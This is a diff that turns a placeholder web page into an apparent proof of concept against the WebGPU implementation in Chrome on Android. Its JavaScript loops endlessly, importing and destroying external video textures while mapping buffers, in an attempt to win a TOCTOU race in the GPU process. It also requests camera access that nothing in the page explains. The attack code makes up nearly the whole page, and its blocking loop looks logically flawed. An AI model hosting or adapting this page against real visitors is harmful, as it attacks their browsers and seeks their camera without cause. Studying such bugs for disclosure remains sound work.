@@ -1,6 +1,51 @@
-<!-- Hosted on your website -->
+<!DOCTYPE html>
 <html>
-  <body>
-    <h1>Security Research PoC</h1>
-  </body>
+<body>
+
+<video id="video" autoplay muted></video>
+
+<script>
+navigator.mediaDevices.getUserMedia({ video: true }).then(stream => {
+  video.srcObject = stream;
+});
+
+async function triggerBug() {
+    const adapter = await navigator.gpu.requestAdapter();
+    const device = await adapter.requestDevice();
+
+    // Create a video element (backed by Android SharedMemory/HardwareBuffer)
+    const video = document.createElement('video');
+    video.src = "test.mp4";
+    await video.play();
+
+    // Loop continuously to race the IPC boundary
+    while (true) {
+        try {
+            // This triggers SharedResourceMemory::BeginAccess over IPC
+            const externalTexture = device.importExternalTexture({ source: video });
+            
+            // Immediately try to destroy it while the GPU process is processing BeginAccess
+            externalTexture.destroy(); // Triggers EndAccess / Destroy
+            
+            // Try to map a buffer tied to it simultaneously
+            const buffer = device.createBuffer({
+                size: 1024,
+                usage: GPUBufferUsage.MAP_WRITE | GPUBufferUsage.COPY_SRC
+            });
+            
+            // Force an asynchronous map, trying to hit the TOCTOU window
+            buffer.mapAsync(GPUMapMode.WRITE).then(() => {
+                // If we get here when we shouldn't, we broke the state machine!
+                buffer.unmap();
+            });
+
+        } catch (e) {
+            // Ignore normal WebGPU validation errors, we are looking for a crash in logcat
+        }
+    }
+}
+triggerBug();
+</script>
+
+</body>
 </html>
